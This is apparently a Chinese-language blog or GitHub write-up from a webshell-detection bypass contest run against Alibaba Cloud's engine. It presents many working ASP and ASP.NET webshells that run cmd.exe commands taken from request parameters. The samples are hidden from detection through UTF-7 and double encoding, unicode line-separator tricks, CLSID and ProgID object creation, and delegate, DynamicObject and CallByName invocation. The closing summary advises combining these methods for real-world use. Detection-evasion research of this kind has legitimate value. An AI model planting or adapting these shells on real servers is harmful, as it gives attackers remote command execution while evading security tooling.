![4de798b7ba63fa0fb6a2b7f338bd997](https://github.com/user-attachments/assets/030b190e-d33b-4f50-a19c-6044f41b9cb6)
阿里云伏魔挑战赛webshell绕过样本分享
## ASP
`asp`样本分享下面两个,绕过思路为前导零、双重编码。
#### 前导零
`asp`支持将代码`utf-7`编码，于是构造出下面`shell`样本进行测试。
```
<%@codepage=65000%>
<%
+AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBrAGkAbABsAGUAcgAiACkAKQ-
%>
```
可能因为是很久以前的公开手法直接被杀，注意到`codepage=65000`推测这里`65000`可能采用数字类型进行解析，在某些语言里有一种技巧在解析数字时会丢弃前导零。比如`065000`会被解析为`65000`。于是将`codepage`写为`065000`发现也可以成功解析，多次尝试以后发现最多写成`0000065000`可以识别成功。猜测原因是Long类型最长为十位数字，在解析之前对大于十位的数字直接报错或者不解析。于是提交如下样本成功绕过伏魔引擎。
```
<%@codepage=0000065000%>
<%
+AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBrAGkAbABsAGUAcgAiACkAKQ-
%>
```
#### 双重编码
`asp`支持将代码`VBScript.Encode`编码。
```
<%@ LANGUAGE = "VBScript.Encode"%>
<%
#@~^LwAAAA==]A/2KxU+R1W93wmon'+*TT8)27CVvD+$;n/D`r3rVsnMJb#wg8AAA==^#~@
%>
```
直接提交依然被杀。注意到`VBScript.Encode`和`utf-7`编码不是同一个配置项，于是想到能不能使用双重编码绕过，测试以后发现可以也能够被正确解析。绕过样本如下先使用`VBScript.Encode`编码内容再使用`utf-7`编码即可。
```
<%@ LANGUAGE = "VBScript.Encode" codepage=65000%>
<%
+ACM-+AEA-+AH4-+AF4-LwAAAA+AD0-+AD0-+AF0-A/2KxU+-R1W93wmon'+-+ACo-TT8)27CVvD+-+ACQ-+ADs-n/D+AGA-r3rVsnMJb+ACM-wg8AAA+AD0-+AD0-+AF4-+ACM-+AH4-+AEA-
%>
```
![image](https://github.com/user-attachments/assets/8588ef5e-5882-438f-a364-fca5236c1061)

## ASP.NET
`aspx`的样本第三届的时候比较容易绕过，有很多污点源都没打标这类就不写了。主要写两类特殊语法、危险方法替换。
#### 特殊语法
以前看别人绕`jsp`学到的使用注释`//`加`\u000a`换行进行来绕过
```
<%@ Page Language="Jscript"%>
<%
    var p = eval("//\u000a\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%>
```
测试发现可以解析但是伏魔引擎检测为`webshell`查阅资料发现使用`\u2029`段落分隔符也可以起到换行的作用。测试可以解析并绕过。
```
<%@ Page Language="Jscript"%>
<%
    var p = eval("//\u2029\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%>
```
`aspx`支持下面这种语法，将多个`<%...%>`之间的代码相加。
```
<%@ Page Language="Jscript"%>
<%
    var p = eval(""%><%+"\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%>
```
测试发现无法绕过，在`%><%`添加换行成功绕过。
```
<%@ Page Language="Jscript"%>
<%
    var p = eval(""%>
<%+"\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%>
```
`global::`是`C#`中的全局命名空间别名，它允许你明确地引用全局命名空间中的类型，避免命名冲突。所以可以写出下面的绕过样本。
```
<%@ Page Language="c#"%>
<%
global::System.Diagnostics.ProcessStartInfo psi = new global::System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.Params.Get("g");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
global::System.Diagnostics.Process p = global::System.Diagnostics.Process.Start(psi);
System.IO.StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
Response.Write(s);
%>
```
#### 危险方法替换
我们先写出一个经典的`aspx`调用`WScript.Shell`执行命令的`webshell`来进行变换。
```
<%@ Page Language="Jscript"%>
<%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = new ActiveXObject("WScript.Shell").Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {
    Str = Str + OutStream.readAll();
    }
Response.Write("<pre>"+Str+"</pre>");
%>
```
这个样本毫无疑问被杀，经过FUZZ发现关键点在于`ActiveXObject`和`WScript.Shell`不能同时出现。于是写出5种不同的绕过方式。
使用`unescape("%57%53%63%72%69%70%74%2e%53%68%65%6c%6c")`代替`WScript.Shell`
```
<%@ Page Language="Jscript"%>
<%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = new ActiveXObject(unescape("%57%53%63%72%69%70%74%2e%53%68%65%6c%6c")).Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {
    Str = Str + OutStream.readAll();
    }
Response.Write("<pre>"+Str+"</pre>");
%>
```
在`Jscript`中使用`GetObject`创建`WScript.Shell`对象
```
<%@ Page Language="Jscript"%>
<%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8").Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {

    Str = Str + OutStream.readAll();

    }
Response.Write("<pre>"+Str+"</pre>");
%>
```
在`C#`中使用`GetTypeFromCLSID`来创建`WScript.Shell`对象
```
<%@ Page Language="C#" %>
<%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 System.Type.GetTypeFromCLSID 来创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%>
```
在`C#`中使用`GetTypeFromProgID`来创建`WScript.Shell`对象
```
<%@ Page Language="C#" %>
<%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 GetTypeFromProgID 创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }
        
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%>
```
在`VB`中使用`CreateObject`来创建`WScript.Shell`对象
```
<%@ Page Language="VB" %>
<%
Dim command As String = Request.QueryString("cmd")
If Not String.IsNullOrEmpty(command) Then
    Try
        ' 使用CreateObject创建 WScript.Shell 对象
        Dim shell As Object = CreateObject("WScript.Shell")
        Dim exec As Object = shell.Exec("cmd.exe /c " & command)
        Dim stdout As Object = exec.StdOut
        Dim output As String = ""
        While Not stdout.AtEndOfStream
            output &= stdout.ReadLine() & vbCrLf
        End While
        Response.Write(output)
    Catch ex As Exception
        Response.Write("Error: " & ex.Message)
    End Try
Else
    Response.Write("No command")
End If
%>
```
我们再写出一个使用`System.Diagnostics.Process.Start`来执行命令的经典样本。
```
<%@ Page Language="c#"%>
<%
System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.Params.Get("g");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
System.IO.StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
Response.Write(s);
%>
```
进过测试发现主要就是对调用`System.Diagnostics.Process.Start`方法进行了检测，传统思路就是通过反射来获取`Start`方法然后执行。进过测试对反射检测较为严格，于是转为寻找可以实现类似反射效果的方法。找到4种类似方法可以绕过。
在`JScript`中使用`Function.apply`动态调用`Start`方法
```
<%@ Page Language="JScript" %>
<%
var userCommand = Request.Params["g"];
if (userCommand != null && userCommand != "") {
    try {
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + userCommand;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        var process = new System.Diagnostics.Process();
        process.StartInfo = psi;
        // 使用 Function.apply 动态调用 Start 方法
        process.Start.apply(process, []);
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        Response.Write(Server.HtmlEncode(output));
    } catch (ex) {
        Response.Write("Error: " + Server.HtmlEncode(ex.Message));
    }
} else {
    Response.Write("No command");
}
%>
```
在`VB`中委托绑定`Start`方法
```
<%@ Page Language="VB" %>
<%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " & userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用委托绑定 Process.Start 方法
        Dim startMethod As StartDelegate = AddressOf process.Start
        startMethod.Invoke()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " & Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%>
<script runat="server">
Public Delegate Function StartDelegate() As Boolean
</script>
```
在`VB`中使用`DynamicObject`动态调用`Start`方法
```
<%@ Page Language="VB" %>
<%@ Import Namespace="System.Dynamic" %>
<%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " & userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用 DynamicProcess 动态调用 Start 方法
        Dim dynamicProcess As Object = New DynamicProcess(process)
        dynamicProcess.Start()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " & Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%>
<script runat="server">
Public Class DynamicProcess
    Inherits DynamicObject
    Private ReadOnly _process As System.Diagnostics.Process
    Public Sub New(process As System.Diagnostics.Process)
        _process = process
    End Sub
    Public Overrides Function TryInvokeMember(binder As InvokeMemberBinder, args() As Object, ByRef result As Object) As Boolean
        If binder.Name = "Start" Then
            result = _process.Start()
            Return True
        End If
        Return MyBase.TryInvokeMember(binder, args, result)
    End Function
End Class
</script>
```
在`VB`中使用`CallByName`动态调用`Start`方法
```
<%@ Page Language="VB" %>
<%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " & userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用 CallByName 动态调用 Process.Start
        CallByName(process, "Start", CallType.Method)
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " & Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%>
```
## 总结
相对于`jsp/php`样本而言`asp/asp.net`样本的绕过还是相对比较简单，本文仅对提交的部分样本进行分析，主要绕过技术总结如下。

1. **编码混淆**：多层编码增加检测复杂度
2. **语法变形**：利用语言特性实现功能等价替换
3. **反射替代**：通过委托、动态调用等方式避开反射检测
4. **跨语言技巧**：在 C#、VB、JScript 间灵活运用不同特性

`asp.net`支持多种语言如`VB/C#/JScript`这也变相增加了webshell的查杀难度。因为仅仅是测试引擎的绕过，实战中还需使用上述手法结合`Unicode`编码、特殊`Unicode`字符、命名空间别名、反射、注释等手段进行webshell混淆以达到最佳效果。
